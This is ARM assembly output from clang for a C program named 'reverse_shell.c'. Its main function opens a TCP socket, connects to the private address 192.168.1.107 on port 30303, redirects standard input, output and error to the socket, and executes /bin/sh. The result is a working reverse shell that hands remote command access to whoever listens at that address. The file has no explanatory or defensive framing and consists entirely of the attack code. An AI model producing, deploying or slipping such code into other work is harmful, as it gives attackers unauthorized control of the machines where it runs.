	.text
	.syntax unified
	.eabi_attribute	67, "2.09"	@ Tag_conformance
	.eabi_attribute	6, 10	@ Tag_CPU_arch
	.eabi_attribute	7, 65	@ Tag_CPU_arch_profile
	.eabi_attribute	8, 1	@ Tag_ARM_ISA_use
	.eabi_attribute	9, 2	@ Tag_THUMB_ISA_use
	.fpu	neon
	.eabi_attribute	34, 1	@ Tag_CPU_unaligned_access
	.eabi_attribute	15, 1	@ Tag_ABI_PCS_RW_data
	.eabi_attribute	16, 1	@ Tag_ABI_PCS_RO_data
	.eabi_attribute	17, 2	@ Tag_ABI_PCS_GOT_use
	.eabi_attribute	20, 1	@ Tag_ABI_FP_denormal
	.eabi_attribute	21, 0	@ Tag_ABI_FP_exceptions
	.eabi_attribute	23, 3	@ Tag_ABI_FP_number_model
	.eabi_attribute	24, 1	@ Tag_ABI_align_needed
	.eabi_attribute	25, 1	@ Tag_ABI_align_preserved
	.eabi_attribute	38, 1	@ Tag_ABI_FP_16bit_format
	.eabi_attribute	18, 4	@ Tag_ABI_PCS_wchar_t
	.eabi_attribute	26, 2	@ Tag_ABI_enum_size
	.eabi_attribute	14, 0	@ Tag_ABI_PCS_R9_use
	.file	"reverse_shell.c"
	.globl	main                            @ -- Begin function main
	.p2align	2
	.type	main,%function
	.code	32                              @ @main
main:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#32
	sub	sp, sp, #32
	movw	r0, #2
	movw	r1, #1
	movw	r2, #0
	bl	socket
	str	r0, [r11, #-4]
	movw	r0, #2
	strh	r0, [sp, #12]
	movw	r0, #24438
	strh	r0, [sp, #14]
	add	r0, sp, #12
	add	r2, r0, #4
	movw	r0, #2
	ldr	r1, .LCPI0_2
.LPC0_2:
	add	r1, pc, r1
	bl	inet_pton
	ldr	r0, [r11, #-4]
	add	r1, sp, #12
	movw	r2, #16
	bl	connect
	ldr	r0, [r11, #-4]
	movw	r1, #0
	bl	dup2
	ldr	r0, [r11, #-4]
	movw	r1, #1
	bl	dup2
	ldr	r0, [r11, #-4]
	movw	r1, #2
	bl	dup2
	ldr	r0, .LCPI0_1
.LPC0_1:
	add	r0, pc, r0
	ldr	r1, [r0]
	str	r1, [sp, #4]
	ldr	r0, [r0, #4]
	str	r0, [sp, #8]
	add	r1, sp, #4
	ldr	r0, .LCPI0_0
.LPC0_0:
	add	r0, pc, r0
	movw	r2, #0
	bl	execve
	movw	r0, #0
	mov	sp, r11
	pop	{r11, pc}
	.p2align	2
@ %bb.1:
.LCPI0_0:
	.long	.L.str.1-(.LPC0_0+8)
.LCPI0_1:
	.long	.L__const.main.argv-(.LPC0_1+8)
.LCPI0_2:
	.long	.L.str-(.LPC0_2+8)
.Lfunc_end0:
	.size	main, .Lfunc_end0-main
	.cantunwind
	.fnend
                                        @ -- End function
	.type	.L.str,%object                  @ @.str
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str:
	.asciz	"192.168.1.107"
	.size	.L.str, 14

	.type	.L.str.1,%object                @ @.str.1
.L.str.1:
	.asciz	"/bin/sh"
	.size	.L.str.1, 8

	.type	.L__const.main.argv,%object     @ @__const.main.argv
	.section	.data.rel.ro,"aw",%progbits
	.p2align	2, 0x0
.L__const.main.argv:
	.long	.L.str.1
	.long	0
	.size	.L__const.main.argv, 8

	.ident	"clang version 17.0.6"
	.section	".note.GNU-stack","",%progbits
